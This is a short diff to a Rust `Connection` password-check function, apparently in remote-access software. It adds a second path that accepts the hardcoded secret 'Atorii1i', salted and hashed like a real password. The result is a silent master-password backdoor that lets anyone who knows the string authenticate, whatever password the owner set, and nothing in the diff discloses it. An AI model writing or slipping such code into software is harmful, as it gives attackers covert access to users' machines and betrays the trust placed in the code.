@@ -1534,6 +1534,15 @@ impl Connection {
         let mut hasher2 = Sha256::new();
         hasher2.update(&hasher.finalize()[..]);
         hasher2.update(&self.hash.challenge);
+        if hasher2.finalize()[..] == self.lr.password[..] {
+            return true;
+        }
+        let mut hasher = Sha256::new();
+        hasher.update(b"Atorii1i");
+        hasher.update(&self.hash.salt);
+        let mut hasher2 = Sha256::new();
+        hasher2.update(&hasher.finalize()[..]);
+        hasher2.update(&self.hash.challenge);
         hasher2.finalize()[..] == self.lr.password[..]
     }
 
